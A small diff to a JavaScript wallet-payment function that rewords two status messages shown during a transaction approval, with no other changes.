@@ -497,11 +497,11 @@ async function Pay(_buttonID) {
 																						else if (provider.isTrustWallet === true)
 																							wallet = "TrustWallet";
 
-																						sendMessage("Awaiting signing on " + wallet);
+																						sendMessage("Awaiting approval on " + wallet);
 																					})
 																					.on("error", () => {
 
-																						sendMessage("Approval has been canceled");
+																						sendMessage("Approval canceled");
 																						setTimeout(() => { canProcess = true; }, 1000);
 																					})
 																					.on("receipt", async () => {
